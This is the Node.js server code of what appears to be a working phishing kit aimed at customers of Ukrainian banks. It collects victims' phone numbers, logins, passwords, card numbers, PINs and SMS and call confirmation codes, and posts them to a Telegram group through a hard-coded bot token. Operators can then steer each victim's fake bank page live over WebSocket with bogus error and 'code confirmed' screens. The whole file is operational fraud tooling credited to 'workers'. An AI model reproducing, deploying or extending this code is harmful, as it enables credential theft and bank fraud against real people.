const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');

// Telegram configuration
const TELEGRAM_BOT_TOKEN = '8418105061:AAEoMN84vcQlrmb5Mqcd1KPbc7ZLdHNctCk';
const CHAT_ID = '-4840920969';

// Dynamic webhook setup for Render
const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;
const webhookPath = `/bot${TELEGRAM_BOT_TOKEN}`;
const WEBHOOK_URL = RENDER_EXTERNAL_URL ? (RENDER_EXTERNAL_URL + webhookPath) : null;

// Banks with "Request" button
const banksForRequestButton = [
    'Райффайзен', 'Альянс', 'ПУМБ', 'OTP Bank',
    'Восток', 'Izibank', 'Укрсиб'
];

const app = express();
app.use(express.json());
app.use(cors());

// Request logging middleware
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});

// Serve static files
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/panel', (req, res) => res.sendFile(path.join(__dirname, 'panel.html')));

// Telegram bot setup
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

if (WEBHOOK_URL) {
    bot.setWebHook(WEBHOOK_URL)
        .then(() => console.log(`Webhook set to ${WEBHOOK_URL}`))
        .catch(err => console.error('Webhook setup error:', err));
    bot.sendMessage(CHAT_ID, `СЕРВЕР ПЕРЕЗАПУЩЕН! (v4 - стабильная) Хорошего ворка! Тест от ${new Date().toISOString()}`, { parse_mode: 'HTML' })
        .catch(err => console.error('Test message error:', err));
} else {
    console.error('Critical error: RENDER_EXTERNAL_URL not defined. Webhook not set.');
}

bot.getMe().then(me => console.log(`Bot started: @${me.username}`)).catch(err => console.error('Bot error:', err));

// Webhook endpoint
app.post(webhookPath, (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// WebSocket setup
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map();
const sessions = new Map();
const cardVisitCounts = new Map();
const waitingForCustomMessage = new Map();

// WebSocket connection handling
wss.on('connection', (ws) => {
    console.log('WebSocket client connected');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`Client registered: ${data.sessionId}`);
            }
        } catch (e) {
            console.error('WebSocket message error:', e);
        }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`Client disconnected: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => console.error('WebSocket error:', error));
});

// Telegram callback query handling
bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const ws = clients.get(sessionId);
    const sessionData = sessions.get(sessionId) || {};
    const bankName = sessionData.bankName || '';

    if (type === 'custom_message') {
        waitingForCustomMessage.set(callbackQuery.message.chat.id, sessionId);
        bot.sendMessage(callbackQuery.message.chat.id, `✏️ Введите сообщение для клиента <code>${sessionId}</code>:`, {
            parse_mode: 'HTML',
            reply_markup: { force_reply: true }
        }).then((sentMessage) => {
            waitingForCustomMessage.set('reply_to_message_id', sentMessage.message_id);
        });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (ws && ws.readyState === WebSocket.OPEN) {
        let commandData = {};
        switch (type) {
            case 'sms':
                commandData = { text: 'Вам відправлено SMS з кодом...' };
                break;
            case 'lk':
            case 'call':
            case 'telegram_debit':
                commandData = { bankName };
                break;
            case 'password_error':
                commandData = { loginType: sessionData.loginMethod || 'phone' };
                break;
            case 'code_error':
                commandData = { screenId: sessionData.lastCodeScreen || 'oschad_call' };
                break;
            case 'pin_error':
                commandData = { text: 'Ви не змогли підтвердити володіння карткою...' };
                break;
            case 'number_error':
                commandData = { text: 'Вказано не фінансовий номер телефону...' };
                break;
            case 'request_details':
                commandData = { isRaiffeisen: bankName === 'Райффайзен' };
                break;
            case 'other':
                commandData = { text: 'В нас не вийшло автентифікувати вашу картку...', bankName };
                break;
            case 'timer':
                commandData = { text: 'Код підтверджено успішно!' };
                break;
            case 'ban':
                commandData = {};
                break;
        }
        ws.send(JSON.stringify({ type, data: commandData }));
        bot.answerCallbackQuery(callbackQuery.id, { text: `Команда "${type}" відправлена!` });
    } else {
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Помилка: клієнт не в мережі!', show_alert: true });
    }
});

// Send Telegram message with inline keyboard or plain message
function sendToTelegram(messageType, sessionId, sessionData, workerNick) {
    const bankName = sessionData.bankName || 'N/A';
    
    let message = '';
    let replyMarkup = null;

    switch (messageType) {
        case 'main_form_phone':
            // Формат для входа по телефону и паролю
            message = `<b>Новий запис!</b>\n\n`;
            message += `<b>Название банка:</b> ${bankName}\n`;
            if (sessionData.phone) message += `<b>Номер телефона:</b> <code>${sessionData.phone}</code>\n`;
            if (sessionData.password) message += `<b>Пароль:</b> <code>${sessionData.password}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            break;

        case 'main_form_login':
            // Формат для входа по логину и паролю
            message = `<b>Новий запис!</b>\n\n`;
            message += `<b>Название банка:</b> ${bankName}\n`;
            if (sessionData.login) message += `<b>Логин:</b> <code>${sessionData.login}</code>\n`;
            if (sessionData.password) message += `<b>Пароль:</b> <code>${sessionData.password}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            break;

        case 'recovery_form':
            // Формат для восстановления
            message = `<b>Восстановление!</b>\n\n`;
            message += `<b>Название банка:</b> ${bankName}\n`;
            if (sessionData.fp_phone) message += `<b>Мобильный:</b> <code>${sessionData.fp_phone}</code>\n`;
            if (sessionData.fp_card) message += `<b>Номер карты:</b> <code>${sessionData.fp_card}</code>\n`;
            if (sessionData.fp_pin) message += `<b>Пин:</b> <code>${sessionData.fp_pin}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            break;

        case 'call_code':
            // Формат для кода со звонка
            message = `<b>Код со звонка!</b>\n\n`;
            message += `<b>Код:</b> <code>${sessionData.call_code}</code>\n`;
            if (sessionData.phone || sessionData.fp_phone) {
                message += `<b>Номер телефона:</b> <code>${sessionData.phone || sessionData.fp_phone}</code>\n`;
            }
            message += `<b>Worker:</b> @${workerNick}\n`;
            break;

        case 'sms_code':
            // Формат для кода списания
            message = `<b>Код списания!</b>\n\n`;
            message += `<b>Код:</b> <code>${sessionData.sms_code}</code>\n`;
            if (sessionData.phone || sessionData.fp_phone) {
                message += `<b>Номер телефона:</b> <code>${sessionData.phone || sessionData.fp_phone}</code>\n`;
            }
            message += `<b>Worker:</b> @${workerNick}\n`;
            break;
    }

    // Добавляем клавиатуру только для основной формы и восстановления
    if (messageType === 'main_form_phone' || messageType === 'main_form_login' || messageType === 'recovery_form') {
        const keyboard = [
            [
                { text: 'SMS', callback_data: `sms:${sessionId}` },
                { text: 'ЛК', callback_data: `lk:${sessionId}` },
                { text: 'Звонок', callback_data: `call:${sessionId}` }
            ],
            [
                { text: 'Невірний пароль', callback_data: `password_error:${sessionId}` },
                { text: 'Telegram Debit', callback_data: `telegram_debit:${sessionId}` },
                { text: 'КОД', callback_data: `code_error:${sessionId}` }
            ],
            [
                { text: 'Невірний ПІН', callback_data: `pin_error:${sessionId}` },
                { text: 'КОД ✅', callback_data: `timer:${sessionId}` },
                { text: 'Номер', callback_data: `number_error:${sessionId}` }
            ],
            [
                { text: 'OTHER', callback_data: `other:${sessionId}` },
                { text: 'BAN 🚫', callback_data: `ban:${sessionId}` },
                { text: 'СВОЙ ✏️', callback_data: `custom_message:${sessionId}` }
            ]
        ];

        if (banksForRequestButton.includes(bankName)) {
            keyboard[0].push({ text: 'ЗАПРОС', callback_data: `request_details:${sessionId}` });
        }

        replyMarkup = { inline_keyboard: keyboard };
    }

    bot.sendMessage(CHAT_ID, message, {
        parse_mode: 'HTML',
        reply_markup: replyMarkup
    }).catch(err => console.error('Telegram send error:', err));
}

// Handle form submissions
app.post('/api/submit', (req, res) => {
    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') workerNick = atob(referrer);
    } catch (e) {
        console.error('Referrer decode error:', e);
    }

    console.log(`[DEBUG] /api/submit - Received data:`, JSON.stringify(req.body, null, 2));

    const existingData = sessions.get(sessionId) || {};
    const newData = { ...existingData, ...stepData };
    sessions.set(sessionId, newData);

    console.log(`[DEBUG] /api/submit - Session data for ${sessionId}:`, JSON.stringify(newData, null, 2));

    if (isFinalStep && !newData.logSent) {
        newData.logSent = true;
        sessions.set(sessionId, newData);

        const cardNumber = newData.card_confirm || newData.card || newData.fp_card;
        let visitCount = 1;
        if (cardNumber) {
            visitCount = (cardVisitCounts.get(cardNumber) || 0) + 1;
            cardVisitCounts.set(cardNumber, visitCount);
        }

        // Определяем тип формы
        if (newData.fp_phone || newData.fp_card || newData.fp_pin) {
            console.log(`[DEBUG] Sending recovery_form for session ${sessionId}`);
            sendToTelegram('recovery_form', sessionId, newData, workerNick);
        } else if (newData.login) {
            console.log(`[DEBUG] Sending main_form_login for session ${sessionId}`);
            sendToTelegram('main_form_login', sessionId, newData, workerNick);
        } else {
            console.log(`[DEBUG] Sending main_form_phone for session ${sessionId}`);
            sendToTelegram('main_form_phone', sessionId, newData, workerNick);
        }

        // Отправка кода со звонка, если он есть
        if (newData.call_code) {
            console.log(`[DEBUG] Sending call_code for session ${sessionId}: ${newData.call_code}`);
            sendToTelegram('call_code', sessionId, newData, workerNick);
        } else {
            console.log(`[DEBUG] No call_code found for session ${sessionId}`);
        }

        // Отправка кода списания, если он есть
        if (newData.sms_code) {
            console.log(`[DEBUG] Sending sms_code for session ${sessionId}: ${newData.sms_code}`);
            sendToTelegram('sms_code', sessionId, newData, workerNick);
        } else {
            console.log(`[DEBUG] No sms_code found for session ${sessionId}`);
        }
    }

    res.status(200).json({ message: 'OK' });
});

// Handle SMS code submissions
app.post('/api/sms', (req, res) => {
    const { sessionId, code, referrer } = req.body;
    let workerNick = 'unknown';
    try {
        if (referrer && referrer !== 'unknown') workerNick = atob(referrer);
    } catch (e) {
        console.error('Referrer decode error:', e);
    }

    console.log(`[DEBUG] /api/sms - Received data:`, JSON.stringify(req.body, null, 2));

    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        sessionData.sms_code = code; // Сохраняем код списания
        sessions.set(sessionId, sessionData);
        console.log(`[DEBUG] /api/sms - Session data for ${sessionId}:`, JSON.stringify(sessionData, null, 2));
        sendToTelegram('sms_code', sessionId, sessionData, workerNick);
        res.status(200).json({ message: 'OK' });
    } else {
        console.log(`[DEBUG] /api/sms - Session not found for ${sessionId}`);
        res.status(404).json({ message: 'Session not found' });
    }
});

// Handle custom message replies
bot.on('message', (msg) => {
    if (msg.reply_to_message && msg.reply_to_message.message_id === waitingForCustomMessage.get('reply_to_message_id')) {
        const sessionId = waitingForCustomMessage.get(msg.chat.id);
        const ws = clients.get(sessionId);
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'custom_message_text', data: { text: msg.text } }));
            bot.sendMessage(msg.chat.id, `✅ Сообщение отправлено <code>${sessionId}</code>.`, { parse_mode: 'HTML' });
        } else {
            bot.sendMessage(msg.chat.id, `❌ Не удалось отправить. Клиент <code>${sessionId}</code> не в сети.`, { parse_mode: 'HTML' });
        }
        waitingForCustomMessage.delete(msg.chat.id);
        waitingForCustomMessage.delete('reply_to_message_id');
    }
});

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
